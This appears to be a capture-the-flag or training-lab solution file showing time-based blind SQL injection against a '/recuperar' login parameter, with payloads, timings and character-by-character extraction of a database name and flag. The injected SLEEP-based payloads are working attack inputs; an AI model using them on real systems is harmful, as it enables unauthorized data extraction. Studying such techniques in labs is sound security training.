-- =============================================================================
-- 03_database_name_extraction.sql
-- SQLi #2: Blind SQLi (Boolean & Temporal) | Academia SPG
-- -----------------------------------------------------------------------------
-- Target     : POST /recuperar  (vulnerable parameter: "user")
-- Technique  : Time-based (temporal) blind SQL injection
-- Goal       : The response body is always HTTP 200 / {"login":"no existe"},
--              so there is no visible TRUE/FALSE oracle left to abuse.
--              IF(condition, SLEEP(3), 0) is used instead: a ~3s response
--              means the condition was TRUE, a ~0s response means FALSE.
-- =============================================================================

-- Step 3a: length of DATABASE() ------------------------------------------------
-- user = admin' AND IF(LENGTH(DATABASE())=7,SLEEP(3),0)-- -
SELECT *
FROM users
WHERE username = 'admin'
  AND IF(LENGTH(DATABASE()) = 7, SLEEP(3), 0)-- -' AND password_hash = '';
-- Response time: ~0.02s  -> FALSE

-- user = admin' AND IF(LENGTH(DATABASE())=8,SLEEP(3),0)-- -
SELECT *
FROM users
WHERE username = 'admin'
  AND IF(LENGTH(DATABASE()) = 8, SLEEP(3), 0)-- -' AND password_hash = '';
-- Response time: ~3.01s  -> TRUE   *** DATABASE() is 8 characters long ***

-- Step 3b: DATABASE() character-by-character -----------------------------------
-- Position 1
SELECT * FROM users WHERE username = 'admin'
  AND IF(SUBSTRING(DATABASE(), 1, 1) = 'a', SLEEP(3), 0)-- -' AND password_hash = '';
-- ~0.02s -> FALSE
SELECT * FROM users WHERE username = 'admin'
  AND IF(SUBSTRING(DATABASE(), 1, 1) = 't', SLEEP(3), 0)-- -' AND password_hash = '';
-- ~3.01s -> TRUE   *** position 1 = 't' ***

-- Position 2
SELECT * FROM users WHERE username = 'admin'
  AND IF(SUBSTRING(DATABASE(), 2, 1) = 'a', SLEEP(3), 0)-- -' AND password_hash = '';
-- ~0.02s -> FALSE
SELECT * FROM users WHERE username = 'admin'
  AND IF(SUBSTRING(DATABASE(), 2, 1) = 'i', SLEEP(3), 0)-- -' AND password_hash = '';
-- ~3.01s -> TRUE   *** position 2 = 'i' ***

-- Position 3
SELECT * FROM users WHERE username = 'admin'
  AND IF(SUBSTRING(DATABASE(), 3, 1) = 'a', SLEEP(3), 0)-- -' AND password_hash = '';
-- ~0.02s -> FALSE
SELECT * FROM users WHERE username = 'admin'
  AND IF(SUBSTRING(DATABASE(), 3, 1) = 'e', SLEEP(3), 0)-- -' AND password_hash = '';
-- ~3.01s -> TRUE   *** position 3 = 'e' ***

-- Position 4
SELECT * FROM users WHERE username = 'admin'
  AND IF(SUBSTRING(DATABASE(), 4, 1) = 'a', SLEEP(3), 0)-- -' AND password_hash = '';
-- ~0.02s -> FALSE
SELECT * FROM users WHERE username = 'admin'
  AND IF(SUBSTRING(DATABASE(), 4, 1) = 'n', SLEEP(3), 0)-- -' AND password_hash = '';
-- ~3.01s -> TRUE   *** position 4 = 'n' ***

-- Position 5
SELECT * FROM users WHERE username = 'admin'
  AND IF(SUBSTRING(DATABASE(), 5, 1) = 'a', SLEEP(3), 0)-- -' AND password_hash = '';
-- ~0.02s -> FALSE
SELECT * FROM users WHERE username = 'admin'
  AND IF(SUBSTRING(DATABASE(), 5, 1) = 'd', SLEEP(3), 0)-- -' AND password_hash = '';
-- ~3.01s -> TRUE   *** position 5 = 'd' ***

-- Position 6
SELECT * FROM users WHERE username = 'admin'
  AND IF(SUBSTRING(DATABASE(), 6, 1) = 'e', SLEEP(3), 0)-- -' AND password_hash = '';
-- ~0.02s -> FALSE
SELECT * FROM users WHERE username = 'admin'
  AND IF(SUBSTRING(DATABASE(), 6, 1) = 'a', SLEEP(3), 0)-- -' AND password_hash = '';
-- ~3.01s -> TRUE   *** position 6 = 'a' ***

-- Position 7
SELECT * FROM users WHERE username = 'admin'
  AND IF(SUBSTRING(DATABASE(), 7, 1) = 'a', SLEEP(3), 0)-- -' AND password_hash = '';
-- ~0.02s -> FALSE
SELECT * FROM users WHERE username = 'admin'
  AND IF(SUBSTRING(DATABASE(), 7, 1) = 'd', SLEEP(3), 0)-- -' AND password_hash = '';
-- ~3.01s -> TRUE   *** position 7 = 'd' ***

-- Position 8
SELECT * FROM users WHERE username = 'admin'
  AND IF(SUBSTRING(DATABASE(), 8, 1) = 'a', SLEEP(3), 0)-- -' AND password_hash = '';
-- ~0.02s -> FALSE
SELECT * FROM users WHERE username = 'admin'
  AND IF(SUBSTRING(DATABASE(), 8, 1) = 'b', SLEEP(3), 0)-- -' AND password_hash = '';
-- ~3.01s -> TRUE   *** position 8 = 'b' ***

-- -----------------------------------------------------------------------------
-- Reconstructed database name (positions 1-8, in order): t i e n d a d b
-- Flag: SPG{tiendadb}
-- =============================================================================
